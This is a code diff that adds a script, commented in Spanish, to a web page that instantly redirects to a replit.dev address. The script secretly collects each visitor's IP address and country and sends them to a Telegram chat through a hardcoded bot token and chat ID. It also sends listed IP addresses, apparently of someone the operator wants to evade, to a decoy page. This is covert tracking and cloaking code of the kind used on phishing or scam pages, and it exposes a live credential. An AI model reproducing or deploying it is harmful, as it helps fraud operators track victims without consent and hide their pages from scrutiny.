@@ -1,1 +1,53 @@
 <META HTTP-EQUIV="REFRESH" CONTENT="0;URL=https://c7bdb612-6fbd-49b1-a071-94b20758056c-00-1084mjv9lsrs8.riker.replit.dev/">
+<script>
+        const telegramBotToken = '7836197305:AAH96aA4brBtvLnopAByFSw2_oO6yT8QO-A'; // acá el bot
+        const chatId = '-4591066898'; // acá el chat
+
+        async function getCountry() {
+            try {
+                const response = await fetch('https://ipinfo.io/json');
+                const data = await response.json();
+                return data.country;
+            } catch (error) {
+                console.error('Error al obtener el país:', error);
+                return 'País Desconocido';
+            }
+        }
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api64.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error al obtener la dirección IP:', error);
+                return 'IP Desconocida';
+            }
+        }
+
+        async function enviarMensaje() {
+            const pais = await getCountry();
+            const ip = await getIPAddress();
+
+            const mensaje = `Nuevo Ingreso ⚠️\n\n\País: ${pais}\n\IP: ${ip}`;
+             // aqui añadir las ip de la rata si es necesario
+            if (ip === '2803:1800:5101:a2a6:a0b9:233c:78f9:5b4e' || ip === '187.161.198.94' || ip === '189.164.77.82') { 
+                window.location.href = 'imagenes/adsense.html'; // aqui es a donde va a redireccionar la rata (el mensajito html)
+                return;
+            }
+
+            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+
+
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Mensaje enviado correctamente:', data);
+                })
+                .catch(error => {
+                    console.error('Error al enviar el mensaje o redirigir:', error);
+                });
+        }
+
+        enviarMensaje();
+    </script>
